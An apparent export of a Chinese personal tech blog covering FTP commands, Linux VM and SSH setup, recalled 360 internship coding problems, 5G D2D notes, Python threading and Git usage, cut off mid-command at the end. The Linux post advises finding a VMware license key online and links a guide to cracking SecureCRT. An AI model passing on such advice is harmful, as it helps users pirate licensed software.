dir-name：删除远程主机目录。</p></li><li><p>57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。</p></li><li><p>58.send local-file[remote-file]：同put。</p></li><li><p>59.sendport：设置PORT命令的使用。</p></li><li><p>60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。</p></li><li><p>61.size file-name：显示远程主机文件大小，如：site idle 7200。</p></li><li><p>62.status：显示当前ftp状态。</p></li><li><p>63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。</p></li><li><p>64.sunique：将远程主机文件名存储设置为只一(与runique对应)。</p></li><li><p>65.system：显示远程主机的操作系统类型。</p></li><li><p>66.tenex：将文件传输类型设置为TENEX机的所需的类型。</p></li><li><p>67.tick：设置传输时的字节计数器。</p></li><li><p>68.trace：设置包跟踪。</p></li><li><p>69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。</p></li><li><p>70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3</p></li><li><p>71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。</p></li><li><p>72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.</p></li><li><p>73.?[cmd]：同help.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>把Linux给我我就能用！</title>
      <link href="/archives/7ef58b2f.html"/>
      <url>/archives/7ef58b2f.html</url>
      
        <content type="html"><![CDATA[<p>原本以为这个世界只有Windows，后来才发现竟然有Linux这个妖怪，还得需要学习使用，想起天下无贼有一段范伟扮演的强盗不懂IQ是什么，说只要给他密码他就能用。学习一个新的知识，不就是拿来使用嘛，所以秉着这个思想，便开始踩坑！</p><p><img src="%E7%BB%99%E6%88%91%E6%88%91%E5%B0%B1%E8%83%BD%E7%94%A8.png" alt="" /></p><p>首先考虑怎么安装，踩坑第一步：</p><ol><li>安装虚拟机。现在Windows还是办公的主力，幻灯片和Word文档，还有许多工具软件，使用macOS 都不可替代，装个虚拟机还是挺好的解决方案，在家有条件了可以买个主机安装linux系统后当做一个服务器，现阶段就还是用虚拟机。</li></ol><ul><li>虚拟机安装：下载：<a href="https://www.vmware.com/cn.html" target="_blank" rel="noopener">VMware官网</a>，选择版本下载Workstations Pro，然后一步步按照提示安装，最后网上收一下授权密钥。</li></ul><ol start="2"><li>选择Linux发行版</li></ol><ul><li>Ubuntu：选择桌面版本对比win，使用习惯改一下就行，不会让人难接受</li><li>CentOS：我安装最小安装版本，之后在Windows软件中通过ssh访问就行。</li><li>原本选择的是centOS.不过后来出了挺多问题，就换回Ubuntu使用，不过桌面还是比字符界面慢好多，但是还是那句话用ssh工具软件远程登录就行，不影响。</li></ul><ol start="3"><li>下载</li></ol><ul><li>可以去一些镜像网站下载，比如我们学校的镜像网站校园网，速度挺快，之前也去过交大下过，也可以去<a href="http://mirrors.ustc.edu.cn/" target="_blank" rel="noopener">中科大</a>、<a href="https://mirrors.tuna.tsinghua.edu.cn/" target="_blank" rel="noopener">清华</a>下载相应的版本。</li></ul><ol start="4"><li>具体怎么安装，打开虚拟机-创建虚拟机-找到镜像文件-下一步-填写一个用户名方便登录使用-配置硬件等-安装。基本是按照一步步走下来不需要具体设置</li></ol><ul><li>这里设置时候有时会牵扯到日后想把文件或者文字在虚拟机和主机之间传递，需要在虚拟机-设置-添加CD/DVD，选择自动检测。一般就可以粘贴了，或者什么都不用设置，以后在远程端操作也行。</li></ul><ol start="5"><li><p>设置网络</p><p>要让虚拟机运行起来怎么能够忘了配置网络呢。</p></li></ol><ul><li>打开虚拟机-设置-网络适配器：网络连接提供三种连接方式，由于我们是在主机联网的情况，所以选择NAT模式，通过主机联网，具体三种的区别，出现问题时再去探究。</li><li>这时候我们Linux使用的是我们Windows中的VMnet8，所以和主机是处在一个网段的。</li><li>使用ifconfig可查看Linux中的IP地址，在Windows中ping以下，看看能不能接通，好为下一步进行操作做准备。</li></ul><ol start="6"><li><p>好了前面坑比较少，真正的坑在慢慢到来。第一个远程连接，不是你给我密码我就能用的！！！</p><ul><li>怎么下载安装<a href="https://www.cnblogs.com/yjd_hycf_space/p/7729796.html" target="_blank" rel="noopener">SecureCRT</a>点击参考安装破解</li><li>开始通过ssh连接了，刚开始我使用quick connect发现linux拒绝我的请求，不对啊，我查看了虚拟机和主机ping过了。后来百度发现是Linux 中ssh没有安装，感觉去Linux中安装，但是安装时，也给我提示<code>Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?</code>好了，这个原因说明我们需要更换Linux的软件源，既然自带的源不好使，还在国外速度慢，那就用我们自己的，前面提到清华源正好用上</li><li>安装ssh</li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">安装openssh-client</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssh-client</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">安装openssh-server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">sudo apt-get install openssh-server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">验证ssh服务开启</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">ps -A|grep ssh</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">没有开启的话就开启：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">sudo service sshd start</span></pre></td></tr></table></figure><ol start="7"><li>替换Linux中的软件源</li></ol><ul><li>Linux中所有的东西都可以通过修改文件来实现，更改源这种小事情当然是一样</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">切换目录</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">cd /etc/apt/</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">备份一下</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">sudo cp sources.list copy_sources.list</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">进行编辑把下面的清华的源加进去</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial universe</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates universe</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial multiverse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates multiverse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security universe</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security multiverse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">最后更新下：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span></pre></td></tr></table></figure><p>这时候还不能用再加下面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo vim /etc/resolv.conf</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">添加下面内容</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">nameserver <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">nameserver <span class="number">223.5</span><span class="number">.5</span><span class="number">.5</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">nameserver <span class="number">223.6</span><span class="number">.6</span><span class="number">.6</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">   最后更新一下：</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span></pre></td></tr></table></figure><p>这时候填坑完毕。</p><p>打开Windows中的SecureCRT，file-quick connect，填写username，密码，之后记住密码，这时候就可以在软件中操作Linux系统。<a href="https://caixp0612.github.io/Linux/Linux%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89/" target="_blank" rel="noopener">Linux使用命令学习</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>360在线笔试编程题</title>
      <link href="/archives/749620d3.html"/>
      <url>/archives/749620d3.html</url>
      
        <content type="html"><![CDATA[<p>前一段时间，申请了360公司的机器学习实习生，今天进行了在线能力测评和在线笔试。其中早晨做的能力测试，数理题和逻辑题个15个，总共30min，题目没做完，中午和师哥他们聊起来，他们给的建议总结来说就是：能力测评，其中第一感觉也是能力的一种。题目还是不算难，有点初中生做小学奥数的感觉。</p><p>晚上7-9点是在线笔试时间，分为客观题40个和编程题3个，共80分，由于是机器学习岗位，所以前一部分是数理统计和机器学习的基础知识，后面是数据结构与算法的题，还有些Python和C++的程序题，感觉和考计算机三级差不多。</p><p>记得考的内容有：</p><ul><li>动态规划</li><li>prim算法</li><li>度量指标</li><li>指数平滑法</li><li>模板类</li><li>抽象类</li><li>广义表</li><li>栈等</li></ul><p><strong>从做题的情况来说，C++要好好掌握，数据结构要理解透侧，机器学习要多分析算法之间的关系，多思考使用的那些细节指标。</strong></p><p>最后是三道编程题：</p><p>1、最近一款吃鸡类型的游戏火爆全球。在组队模式下，你可以邀请自己的好友组建自己的小队，并选择是否填充（是否同意和非好友游玩），然后加入游戏。现在有A个单人队伍，B个双人队伍，C个三人队伍，D个四人队伍，并且全都同意填充，请问最多能组成多少个四人队伍。</p><p>输入<br />第一行一个正整数T，表示数据组数。（1≤T≤100）</p><p>接下来T行，每行四个非负整数，A，B，C，D。（0≤A, B, C, D≤150）</p><p>输出<br />共T行，每行输出一个队伍数。</p><pre><code>样例输入41 2 3 44 3 2 12 2 2 10 2 0 1样例输出6542</code></pre><p>2、给定一个长度为N的序列A1到AN，现在要对序列进行M次操作，每次操作对序列的前若干项进行升序或降序排列，求经过这M次操作后得到的序列。</p><p>输入<br />第一行包含两个整数N和M，1≤N，M≤105。</p><p>第二行包含N个空格隔开的整数A1到AN，1≤Ai≤109。</p><p>接下来M行，每行包含两个整数t和x，0≤t≤1，1≤x≤N。若t=0，则表示对A1到Ax进行升序排列；若t=1，则表示对A1到Ax进行降序排列。操作执行顺序与输入顺序一致。</p><pre><code>输出输出N个空格隔开的整数，即经过M次操作后得到的序列。样例输入4 21 2 4 31 30 2样例输出2 4 1 3</code></pre><p>3、给定一个1到N的排列A1到AN，每次可以将排列的第一个数移到排列的末尾，假设经过若干次移动后得到排列B1到BN，那么|B1-1|+|B2-2|+|B3-3|+…+|BN-N|的最小值是多少？</p><p>样例解释</p><p>经过两次移动后得到排列{1 5 2 4 3}，此时|B1-1|+|B2-2|+|B3-3|+|B4-4|+|B5-5|取得最小值。</p><p>输入<br />第一行包含一个整数N，1≤N≤105。</p><p>第二行包含N个空格隔开的整数A1到AN。</p><pre><code>输出输出|B1-1|+|B2-2|+|B3-3|+...+|BN-N|的最小值。样例输入54 3 1 5 2样例输出6</code></pre>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5G终端协同场景下的通信系统技术</title>
      <link href="/archives/60bf0728.html"/>
      <url>/archives/60bf0728.html</url>
      
        <content type="html"><![CDATA[<h1 id="center整理5g终端协同场景下通信性能分析以及优化策略研究"><a class="markdownIt-Anchor" href="#center整理5g终端协同场景下通信性能分析以及优化策略研究"></a> <center>【整理】5G终端协同场景下通信性能分析以及优化策略研究</h1><p>由于无线移动通信的不断发展，落地的新兴产业应用使得，用户对于网络的传输速率、时延、吞吐量有了更高的要求。-----新一代移动通信技术5G。</p><p>所谓用户体验：网速快，时延低，通信可靠，传输距离远等，</p><p>D2D ，一定范围内的用户进行直接通信，不需要基站的转接，</p><p>我们的D2D技术和中继技术的D2D辅助中继通信技术，可以使得用户UE作为中继，来辅助用户-用户、用户-基站进行通信。</p><ul><li>用户到网络中继技术UE-to-Network Relay。 借助用户用户间的近距离通信，特定用户可以作为中继来辅助其他用户与基站之间的通信交互传输，使得小区边缘用户获得良好的连接体验。</li></ul><p>上面解决了小区边缘用户进行快速通信传输的问题，但是针对密集节点的部署带来的网络能耗高的问题，可以从传输链路入手解决。</p><ul><li>上面提到的用户网络中继技术，在扩展小区服务范围和提升用户体验上面有显著的成效，但是在用户数量急剧增加的情况下，回城链路的压力是很大的，所以考虑使用内容缓存技术，减少数据的流量。所以联合两种技术来分析5G终端协同通信场景下的性能。</li></ul><p>最后要达到的目的，降低用户的功耗情况下，同时降低中断概率等。</p><h3 id="一-移动通信技术的发展"><a class="markdownIt-Anchor" href="#一-移动通信技术的发展"></a> 一、移动通信技术的发展</h3><ul><li>20`80，1G，频分多址，模拟通信</li><li>20`90，2G，时分多址，数字语音通信</li><li>21初，3G，码分多址，</li><li>4G，正交频分多址技术，两种调制方式TD-LTE，FDD-LTE</li></ul><p>然后通过发展的背景来看，通信系统的链路性能已经接近<code>香农极限</code></p><ul><li><p>5G出现，对应高速率、高容量、高可靠、低时延</p><ul><li>应用场景：eMBB增强移动宽带、mMTC大规模机器通信、超高可靠低时延通信uRLL。</li></ul></li><li><p>5G终端协同场景TCS：指的是用户侧的若干个终端设备之间互为协同关系。充分发挥网络与终端协同融合带来的服务能力的提升。</p></li></ul><h4 id="在以前主要是考虑在基站侧通过设计超密集异构网络来提高频谱效率但是对于移动运营商来说需要考虑大部分用户的需求并能够保证网络分配合理统一所以d2d技术就是为了应对移动用户的激增依靠终端侧设备之间的特点-优势和限制合理分配资源和选择缓存策略来提高频谱利用效率实现绿色高效的通信"><a class="markdownIt-Anchor" href="#在以前主要是考虑在基站侧通过设计超密集异构网络来提高频谱效率但是对于移动运营商来说需要考虑大部分用户的需求并能够保证网络分配合理统一所以d2d技术就是为了应对移动用户的激增依靠终端侧设备之间的特点-优势和限制合理分配资源和选择缓存策略来提高频谱利用效率实现绿色高效的通信"></a> 在以前主要是考虑在基站侧，通过设计超密集异构网络，来提高频谱效率，但是对于移动运营商来说，需要考虑大部分用户的需求，并能够保证网络分配合理统一，所以D2D技术就是为了应对移动用户的激增，依靠终端侧设备之间的特点、优势和限制，合理分配资源和选择缓存策略，来提高频谱利用效率，实现绿色高效的通信。</h4><h3 id="二-d2d技术"><a class="markdownIt-Anchor" href="#二-d2d技术"></a> 二、D2D技术</h3><p>传统蜂窝网络系统采用的是基站为中心的覆盖形式，任何用户之间的通信必须经过基站转接。D2D技术可以依靠用户位置的分布，允许一定范围内的特性用户之间进行通信。</p><ul><li>简单D2D通信，终端之间距离较近</li><li>中继用户辅助D2D通信，终端之间距离比较远的时候，选择特性用户作为中继用户</li><li>中继用户辅助蜂窝通信，将D2D对中的其中一个用户作为中继，让另一个用户来和基站进行通信。</li><li>D2D协同通信，若干个终端通过D2D技术进行建立自组织网络，互相进行数据传输</li></ul><p>1、为了提升移动通信系统的整体性能，可以在发送端和接收端中间增加中继节点，中继用户辅助蜂窝网络技术利用特定条件的用户作为中继节点，这种技术虽然提升了整体性能，但是也增加了能耗，因此需要采用合理的策略来管理中继节点的资源分配、节点选择等。</p><p>按功能：</p><ul><li>层一中继：只是简单的将接受的信号进行放大转发，但是噪声会随着有用的信号一同放大</li><li>层二中继：解码转发中继，对接收的信号进行解调解码处理，复杂度高，处理时延，但是噪声控制好。</li><li>层三中继：有完整的无线资源控制层、介质访问控制层、物理层，可以当做低功率的基站。</li></ul><p>2、通信模式选择算法：</p><ul><li>基于链路质量：若D2D用户之间的链路质量（信号强度、速率）高于蜂窝链路，就采用D2D直接通信</li><li>基于距离：考虑长期平均链路质量可以简化为距离，当D2D用户之间距离小于某一阈值时，就采用D2D直接通信</li><li>基于位置：中心区域和边缘区域</li></ul><h3 id="需要解决的问题中继节点的选择问题-资源分配问题-中继节点一般电量充足-与基站的链路稳定-存储能力强-有一定计算处理能力等"><a class="markdownIt-Anchor" href="#需要解决的问题中继节点的选择问题-资源分配问题-中继节点一般电量充足-与基站的链路稳定-存储能力强-有一定计算处理能力等"></a> 需要解决的问题中继节点的选择问题、资源分配问题。（中继节点一般电量充足、与基站的链路稳定、存储能力强、有一定计算处理能力等）</h3><h3 id="三-内容缓存"><a class="markdownIt-Anchor" href="#三-内容缓存"></a> 三、内容缓存</h3><p>未来5G应用场景下，会由点与点通信发展到接收海量数据，因此5G系统下系统的容量至少提升1000倍。在云计算与5G相结合的今天，可以通过基于缓存技术的移动边缘计算，对用户请求的内容流行性进行分析和预测，将重复请求的内容放在移动网络边缘节点中，从而降低业务时延，减轻回程链路的负载压力。<br />说的好理解点，就是用户在请求网络资源的时候，大部分是集中在流行度较高的热门内容，通过分析用户请求，将这些热门内容文件提前缓存或者动态缓存在网络中。这样可以缓解下行链路的负载、降低响应时延。</p><p>内容缓存技术分类：</p><ul><li>终端缓存：降低用户功耗，可以直接从自身设备或者周边智能设备获取缓存文件，无须与基站进行连接；减少基础设施的建设；减轻回程负载压力</li><li>基站缓存：降低回程链路带宽需求。</li></ul><p>目前的缓存技术：</p><ul><li>等概率随机缓存EPRC：命中率低</li><li>流行文件缓存策略MPC：丰富度低。过度冗余。</li></ul><h3 id="四-随机集合理论"><a class="markdownIt-Anchor" href="#四-随机集合理论"></a> 四、随机集合理论：</h3><ul><li>传统的蜂窝均匀分布模型，被验证不适用于当今节点随机分布且不均匀的现代移动通信网络。</li><li>点过程可以指区域中随机分布的点的集合，在满足一定随机分布过程的情况用来表示网络拓扑结构。</li></ul><p>利用随机几何理论对通信网络进行建模分析。可以使用的是随机集合理论可以较好的建模蜂窝网络中基站随机分布特点，通过在二维平面上做统计平均，推导出相关网络性能指标的数学表达式。</p><h3 id="五-基于随机几何的系统建模"><a class="markdownIt-Anchor" href="#五-基于随机几何的系统建模"></a> 五、基于随机几何的系统建模</h3>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> D2D </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python中的多线程</title>
      <link href="/archives/949db3a1.html"/>
      <url>/archives/949db3a1.html</url>
      
        <content type="html"><![CDATA[<h1 id="多线程-多进程"><a class="markdownIt-Anchor" href="#多线程-多进程"></a> 多线程、多进程</h1><ol><li><p>概念</p><ul><li>进程：计算机中需要执行的任务称之为进程，比如浏览器的运行、播放音乐。可以通过fork和spawn派生出新的进程来执行其他任务。进程间通过进程间通信方式进行通信。</li><li>线程：进程中，需要完成的一个多个任务称之为线程，共享相同的上下文，被称之为迷你进程。比如播放音乐中需要输出歌词和音频。同一进程下线程间时共享数据空间。</li></ul></li></ol><ul><li><p>让步：线程中有指令指针，当其他的线程进行时，指针可以被抢占和挂起。</p></li><li><p>竞态条件：多个线程访问同一片数据，访问顺序不同可能造成的结果不同。</p><p>进程和线程都是执行多任务的实现方法。</p></li></ul><ol start="2"><li><p>实现多任务的方式</p><p>采用以下三种方式：</p></li></ol><ul><li>多进程</li><li>多线程</li><li>多进程中多线程（较为复杂，使用较少）</li></ul><ol start="3"><li><p>多线程的适用类型</p><p>适用于的任务类型：</p></li></ol><ul><li><p>本质是异步</p></li><li><p>多个并发</p></li><li><p>根据应用需求，执行顺序不确定</p><p>根据应用的不同，子任务可能需要先运算出中间结果，在合并为最终结果。</p><p>计算密集型/IO密集型</p></li><li><p>计算密集型任务的特点是要进行大量的计算，消耗CPU资源，靠CPU的运算能力。这种任务一般需要高效利用CPU，对于代码的执行效率要求很高，可以设置同时进行的任务数为CPU的核心数。</p></li><li><p>IO密集型，涉及到网络、磁盘IO的任务，这种任务的大部分时间都在等待IO操作完成（因为IO的速度远远低于CPU和内存的速度）。对于IO密集型任务，任务越多，CPU效率越高，但也有一个限度。常见的大部分任务都是IO密集型任务，比如Web应用。对于IO密集型任务，最合适的语言就是开发效率最高（代码量最少）的语言，脚本语言是首选，C语言最差。</p><p>在Python中由于代码是在Python虚拟机中执行（解释器主循环），而主循环中只允许同时只有一个线程运行，对虚拟机的访问时利用全局解释器锁GIL控制的，所以在Python中多线程更适合IO密集型任务。</p></li></ul><ol start="4"><li><p>多线程能提高系统的性能</p><p>通过适用多线程编程可以通过将复杂问题简化，比如将编程任务规划成几个特定函数的线程。个线程之间功能明确、清晰。</p></li></ol><ul><li>UserRequestThread：读取输入</li><li>RequestProcessor：根据输入处理请求</li><li>ReplyThread：向用户输出</li></ul><h2 id="python解释器执行流程"><a class="markdownIt-Anchor" href="#python解释器执行流程"></a> Python解释器执行流程：</h2><ul><li><p>设置GIL</p></li><li><p>切换到一个线程执行</p></li><li><ol><li>指定数量的字节码指令</li><li>线程让出控制权time.sleep()</li></ol></li><li><p>切换出线程</p></li><li><p>解锁GIL</p></li><li><p>重复以上步骤</p></li></ul><h2 id="_thread-threading"><a class="markdownIt-Anchor" href="#_thread-threading"></a> _thread、threading</h2><p>Python中实现多线程使用到的模块为_thread和threading模块，Python核心编程中建议使用threading，他们之间的差别是：</p><ul><li>前者更为底层基础，后者功能更加丰富，有着更多的同步原语可供操作</li><li>前者对于进程何时退出没有控制，当主线程结束时，其他线程也将结束，并没有警告；后者能够保证重要的子线程在进程退出前结束</li><li>前者不支持守护进程daemon，所谓的守护进程通常是指的一些不重要的进程一般是等待客户端请求服务的服务器，当主线程想要结束，不需要等待子线程的结束，那么可以吧这些线程设置为守护进程。</li><li>其实Python3中都把thread改为_thread了，也就是建议用户尽量使用threading模块了。</li></ul><p>多线程应用编程中可能需要使用的模块：</p><ul><li>_thread</li><li>threading</li><li>multiprocessing</li><li>subprocess</li><li>Queue</li><li>mutex：互斥对象</li><li>concurrent.futures</li><li>SocketServer：创建/管理线程控制的TCP/UDP服务器</li></ul><h2 id="threading中的对象"><a class="markdownIt-Anchor" href="#threading中的对象"></a> threading中的对象</h2><ul><li>Thread</li><li>Lock</li><li>RLock</li><li>Condition</li><li>Event</li><li>Timer</li><li>Semaphore：为线程间共享的有限资源提供一个“计数器”，没有可用资源时被阻塞</li><li>BoundedSemaphore：与上面不同的是不允许超过初始值</li><li>Barrier：创建一个“障碍”，必须达到指定数量线程后才能继续</li></ul><p>Thread类</p><ul><li>name</li><li>ident</li><li>daemon：守护进程的标识</li><li>start()</li><li>run()：定义线程功能的方法。创建子类时，被用户重写</li><li>join()</li><li>__ init __(group=None, target= None, name=None,args=None,kwargs={}, verbose=None,daemon=None)</li></ul><p>使用Thread类，来创建线程的方式：</p><ul><li>创建Thread实例，并向它传入一个函数</li><li>创建Thread实例，并向它传递可调用的类实例</li><li>派生Thread的子类，并创建子类的实例</li></ul><p>上面三种一般是采用第一种和第三种，第三种更加符合面向对象的接口设计。</p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>怎么样使用Git？</title>
      <link href="/archives/7fd01c5b.html"/>
      <url>/archives/7fd01c5b.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是git"><a class="markdownIt-Anchor" href="#什么是git"></a> 什么是Git？</h1><p>首先一个问题就是：什么是Git？用来干什么？</p><p>维基百科中是这么说的：Git是一种分布式版本控制软件。Git是用C语言开发的，追求高性能，它的TCP监听端口是9418，刚开始是用于Linux内核开发的版本控制，不需要服务器端软件，就可以运作版本控制软件，使得源代码的发布和交流极为方便。</p><h1 id="git中的数据结构"><a class="markdownIt-Anchor" href="#git中的数据结构"></a> Git中的数据结构</h1><ul><li>可变的索引</li><li>不可变的、仅追加的对象数据库</li></ul><p>下面总结下常用的基本语法</p><h1 id="基本使用方法"><a class="markdownIt-Anchor" href="#基本使用方法"></a> 基本使用方法</h1><p>使用之前需要先安装，附官网地址：<a href="https://www.git-scm.com/download/" target="_blank" rel="noopener" title="Git下载">https://www.git-scm.com/download/</a></p><p>使用Git，要知道什么是工作区、暂存区、版本库。<br />本地进行存储的称之为工作区，然后修改文件之后，先将文件add暂存区，暂存区保存未提交的修改，最后将暂存区的修改commit到版本库（之后还需要push远程）。</p><ol><li>在windows中安装使用Git，打开Git Bash新建一个空文件夹，用于本地项目的存储，文件夹路径不要使用中文名字。</li></ol><ul><li>mkdir  xxx：创建文件夹</li><li>cd xxx：进入文件夹</li><li>git init：文件夹初始化为本地库</li></ul><ol start="2"><li>修改、添加、提交</li></ol><ul><li>vi <a href="http://README.md" target="_blank" rel="noopener">README.md</a>：新建编辑文档</li><li>git add <a href="http://README.md" target="_blank" rel="noopener">README.md</a>：将本地文档添加入暂存区</li><li>git commit -m <a href="http://README.md" target="_blank" rel="noopener">README.md</a>：提交到版本分支上</li><li>git status：查看暂存区状态</li><li>git diff <a href="http://README.md" target="_blank" rel="noopener">README.md</a>：查看修改</li></ul><ol start="3"><li>查看日志和回退功能</li></ol><ul><li>git log：查看提交日志</li><li>git reflog：记录所有的操作</li><li>git reset --hard HEAD^：版本回退当前版本的上一个版本</li><li>git reset --hard id：根据版本号进行回退，版本号可以在log中看到</li><li>git checkout – <a href="http://README.md" target="_blank" rel="noopener">README.md</a> ：当没有进行add时，可以撤销上一版本add或者提交之后的所有修改</li><li>git reset HEAD <a href="http://README.md" target="_blank" rel="noopener">README.md</a>：当这是add之后没有commit，这一步加上一步进行撤销修改</li><li>git reset --hard id：当已经commit之后，可以通过回退进行退回到以前版本。</li></ul><ol start="4"><li>删除操作和误操作解决办法</li></ol><ul><li>git rm <a href="http://README.md" target="_blank" rel="noopener">README.md</a>：删除文档，并告诉暂存区</li><li>git commit -m “remove a file”：提交删除信息</li><li>git reset --hard HEAD^：撤销修改</li><li>git checkout – <a href="http://READMD.md" target="_blank" rel="noopener">READMD.md</a>：找回删除的文件</li></ul><ol start="5"><li>连接、克隆远程库，下面还涉及到连接多个远程库，进行共同管理</li></ol><ul><li>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:Caixp0612/dragon.git：远程连接github上的远程库</li><li>git push -u origin master：将本地库推送到远程</li><li>git clone <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:Caixp0612/dragon.git：克隆远程库到本地</li></ul><ol start="6"><li>分支管理</li></ol><ul><li>git checkout -b dev：创建并切换分支</li><li>git checkout master：切换分支</li><li>git branch：查看分支信息</li><li>git merge dev：在分支完成修改开发，可以在mater下进行合并</li><li>git branch -d dev：当不在分支上进行工作时可以删除分支</li><li>git log --graph --pretty=oneline --abbrev-commit：该命令可以看到分支合并情况。</li><li>git merge --no-ff -m “merge with no-ff” dev：合并新的分支并禁用fast-forward模式，可以看到分支合并的信息</li></ul><ol start="7"><li>保存和恢复工作现场</li></ol><ul><li>git stash：保存当前工作，</li><li>git stash list：查看当前保存的工作区</li><li>git stash apply stash@{n} 恢复制定的工作区</li><li>git stash drop：清空stash内容</li><li>git stash pop：恢复同时清空stash内容</li><li>git branch -D dev：丢弃未被合并的分支，需要使用参数D</li></ul><ol start="8"><li>标签管理，通过打标签使得版本更新更清晰</li></ol><ul><li>git tag v0.1 commit_id：给指定的ID上标签</li><li>git show v0.1：查看标签信息</li><li>git tag -a v0.1 -m  “xxx”：创建带有说明的标签</li><li>git tag -d v0.1：删除标签</li><li>git push origin v0.1：将标签推送到远程</li><li>git push origin --tags：将全部标签推送到远程</li><li>git push origin 